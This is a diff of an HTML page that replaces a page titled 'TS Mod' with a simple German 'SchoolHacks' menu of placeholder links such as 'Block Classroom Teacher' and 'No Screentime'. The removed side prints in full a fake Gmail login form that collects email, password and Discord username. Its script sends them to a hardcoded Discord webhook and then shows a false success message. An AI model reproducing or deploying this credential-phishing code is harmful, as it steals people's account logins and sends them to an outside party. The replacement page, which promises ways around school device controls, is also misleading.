@@ -1,157 +1,52 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TS Mod</title>
-    <link rel="stylesheet" href="/s.css">
+    <title>SchoolHacks</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@1,500&display=swap');
-        * {
-            padding: 0;
+        body {
+            font-family: Arial, sans-serif;
             margin: 0;
-            box-sizing: border-box;
-            font-family: 'Poppins', sans-serif;
-        }
-        .box {
+            padding: 0;
+            background-color: #f3f3f3;
             display: flex;
-            height: 100vh;
+            flex-direction: column;
+            align-items: center;
             justify-content: center;
-            align-items: center;
-            user-select: none;
+            height: 100vh;
         }
-        .form {
-            width: 400px;
-            min-height: 400px;
-            padding: 32px;
-            border-radius: 10px;
-            box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px, rgb(51, 51, 51) 0px 0px 0px 3px;
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background: white;
+            padding: 20px;
+            border-radius: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
         }
-        .form-title {
-            font-weight: 400;
-            margin-top: 10px;
-            margin-bottom: 20px;
-            font-size: 20px;
-        }
-        .form-group {
-            height: 48px;
-            margin: 20px;
-            position: relative;
-        }
-        .form-control {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: none;
-            border: 1px solid #a1a1a1;
-            outline: none;
-            padding: 16px;
-            border-radius: 3px;
-            z-index: 1;
-        }
-        .class-label {
-            position: absolute;
-            left: 13px;
-            top: 13px;
-            color: #a1a1a1;
-            background-color: white;
-            padding: 0 6px;
-            font-size: 14px;
-            transition: .4s;
-        }
-        .form-control:focus + .class-label {
-            top: -12px;
-            z-index: 10;
-            color: blue;
-            font-weight: 300;
-        }
-        .form-control:focus {
-            border: 2px solid blue;
-        }
-        .form-control:not(:focus):valid + label {
-            top: -12px;
-            z-index: 10;
-        }
-        .bottom-button {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 50px;
-        }
-        .bottom-button a {
-            text-decoration: none;
-            color: blue;
-            font-size: 16px;
-            font-weight: 500;
-        }
-        .form-button {
+        .link {
             display: block;
-            padding: 12px 32px;
-            border: none;
-            background-color: blue;
+            background: #4CAF50;
             color: white;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: .4s;
+            text-decoration: none;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 10px;
+            font-size: 18px;
+            transition: 0.3s;
         }
-        .form-button:hover {
-            box-shadow: 0 10px 36px rgba(0, 0, 0, 0.16);
+        .link:hover {
+            background: #45a049;
         }
     </style>
 </head>
 <body>
-    <div class="box">
-        <form class="form" onsubmit="sendMessage(event)"> 
-            <h1 class="form-title">Login</h1>
-            <div class="form-group">
-                <input id="email" type="text" class="form-control" required>
-                <label for="email" class="class-label">Gmail</label>
-            </div>
-            <div class="form-group">
-                <input id="password" type="password" class="form-control" required>
-                <label for="password" class="class-label">Password</label>
-            </div>
-            <div class="form-group">
-                <input id="discord" type="text" class="form-control" required>
-                <label for="discord" class="class-label">Discord User</label>
-            </div>
-            <div class="form-group">
-                <label class="show-label">
-                    <input type="checkbox" id="show"> Show password
-                </label>
-            </div>
-            <div class="bottom-button">
-                <a href="#">Forget password?</a>
-                <button type="submit" class="form-button">Next</button>
-            </div>
-        </form>
+    <div class="container">
+        <h2>Hiii</h2>
+        <a href="#" class="link">Block Classroom Teacher</a>
+        <a href="#" class="link">No Screentime</a>
+        <a href="#" class="link">Install App</a>
     </div>
-
-    <script>
-        function sendMessage(event) {
-            event.preventDefault(); // Verhindert das Neuladen der Seite
-            
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const discordUser = document.getElementById('discord').value;
-
-            const request = new XMLHttpRequest();
-            request.open("POST", "https://discord.com/api/webhooks/1303003841112965130/Yzw5LH8tHu-PlzM6_Ft7QFBhVss88gz8_dBzmbW0DKUDmIp9ovPNSD_tHOBib-vfo0Cg");
-
-            request.setRequestHeader('Content-type', 'application/json');
-
-            const params = {
-                username: "Michl",
-                avatar_url: "",
-                content: `Email: ${email}\nPassword: ${password}\nDiscord: ${discordUser}`
-            };
-
-            request.send(JSON.stringify(params));
-
-            alert("Form submitted successfully!");
-        }
-    </script>
 </body>
 </html>
